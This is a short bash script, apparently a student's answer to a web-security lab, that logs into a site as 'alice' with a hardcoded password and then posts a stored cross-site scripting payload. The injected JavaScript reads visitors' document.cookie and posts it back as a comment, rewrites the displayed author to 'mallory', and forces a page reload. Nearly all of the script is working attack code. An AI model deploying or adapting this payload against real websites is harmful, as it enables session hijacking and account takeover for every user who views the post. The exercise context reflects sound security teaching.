#gets the first command line argument and gives it the following variable name
webpageLink="$1";

#send a request to log in as Alice and log the output
curl -i -c cookies.txt -d "username=alice" -d "password=easypasswd" -d "form=login" -d "submit=Login" "$webpageLink/post.php" > response.txt

#send a request to upload the script created in parts a and b of the question
curl -i -b cookies.txt -d "title=Cookie Printer" --data-urlencode "content=<script>function getID(){if(window.location.href.indexOf('view.php?id=')>-1){var URLData=new URLSearchParams(window.location.search);var idValue=URLData.get('id');if(parseInt(idValue)){return idValue}}return}function leakCookies(postID){var xhr=new XMLHttpRequest();xhr.open('POST','post.php',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.onreadystatechange=function(){if(xhr.readyState===XMLHttpRequest.DONE&&xhr.status===200){}};xhr.send('comment='+document.cookie+'&form=comment&parent='+postID)}if(window.location.href.indexOf('view.php')>-1){var URLData=new URLSearchParams(window.location.search);var idValue=URLData.get('id');if(parseInt(idValue)){document.getElementById('author').innerHTML=document.getElementById('author').innerHTML.replace('alice','mallory');window.onload=function(){leakCookies(getID());if(window.location.hash==False){if(window.location.href.indexOf('view.php')>-1){window.location=window.location+'#loaded';window.location.reload()}}}}}</script>" -d "type=1" -d "form=content" -d "submit=Post" "$webpageLink/post.php" >> response.txt
